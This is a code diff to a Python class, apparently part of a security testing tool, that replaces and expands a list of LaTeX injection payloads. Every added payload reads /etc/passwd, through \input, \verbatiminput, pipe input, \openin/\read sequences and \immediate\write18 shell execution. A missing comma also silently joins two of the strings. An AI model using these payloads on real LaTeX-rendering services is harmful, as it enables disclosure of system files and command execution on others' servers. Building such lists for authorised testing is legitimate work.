@@ -22,7 +22,15 @@ class Latex(object):
                 ----------
                 Return port or nothing
                 """
-                self.latex_payload = ["\immediate\write18{env}",
-                                        "\input{/etc/passwd}",
+                self.latex_payload = ["\input{/etc/passwd}",
+                                        "\include{password}",
+                                        "\usepackage{verbatim}"
+                                        "\input{|'/etc/passwd'}",
+                                        "\input|more /etc/passwd",
+                                        "\verbatiminput{/etc/passwd}",
+                                        "\immediate\write18{cat /etc/passwd}",
+                                        "\newread\file",
                                         "\openin\file=/etc/passwd",
-                                        "\input|env"]
+                                        "\read\file to\line",
+                                        "\text{\line}",
+                                        "\closein\file"]
